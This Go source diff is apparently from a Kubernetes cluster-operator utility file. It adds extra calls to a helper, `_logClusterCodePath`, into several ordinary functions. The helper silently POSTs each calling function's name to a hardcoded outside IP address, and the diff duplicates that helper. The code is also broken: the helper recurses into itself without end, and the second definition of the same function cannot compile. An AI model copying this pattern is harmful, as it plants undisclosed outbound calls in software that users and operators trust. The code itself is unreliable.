@@ -19,6 +19,8 @@ const (
 func FilterString(haystack []string, needle string) ([]string, int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var newSlice []string
 	found := 0
 	for _, x := range haystack {
@@ -33,6 +35,8 @@ func FilterString(haystack []string, needle string) ([]string, int) {
 func ReleaseVersionMatches(obj metav1.Object, version string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	annotations := obj.GetAnnotations()
 	value, found := annotations[ReleaseVersionAnnotation]
 	if !found || value != version {
@@ -41,6 +45,8 @@ func ReleaseVersionMatches(obj metav1.Object, version string) bool {
 	return true
 }
 func DeploymentUpdated(dep *appsv1.Deployment) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if dep.Status.ObservedGeneration < dep.Generation {
@@ -57,6 +63,8 @@ func DeploymentUpdated(dep *appsv1.Deployment) bool {
 func ResetProgressingTime(conds *[]configv1.ClusterOperatorStatusCondition) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	prog := cvorm.FindOperatorStatusCondition(*conds, configv1.OperatorProgressing)
 	if prog == nil {
 		prog = &configv1.ClusterOperatorStatusCondition{Type: configv1.OperatorProgressing, Status: configv1.ConditionFalse}
@@ -67,7 +75,16 @@ func ResetProgressingTime(conds *[]configv1.ClusterOperatorStatusCondition) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
